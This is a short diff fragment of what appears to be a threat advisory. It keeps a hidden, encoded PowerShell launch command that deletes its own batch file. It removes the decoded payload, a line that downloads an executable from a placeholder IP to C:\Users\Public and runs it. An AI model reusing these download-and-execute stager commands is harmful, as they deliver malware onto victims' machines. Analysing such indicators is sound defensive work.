@@ -70,12 +70,6 @@ threat:
     following content:  
 
     powershell -exec bypass -noP -w hidden -nonI -enc"{string}" del %0;
-
-    The Base64-encoded PowerShell decodes to:
-
-    (New-objectNetWebClient)DownloadFile('hxxp://{ip_address}/MSDriverLoader[.]exe','C:\Users\Public\MSLoaderexe');Start-Process 'c:\Users\Public\MSLoaderexe'
-    
-    (ref [a])  
     
     Other possible examples for encoding with PowerShell commands: 
 
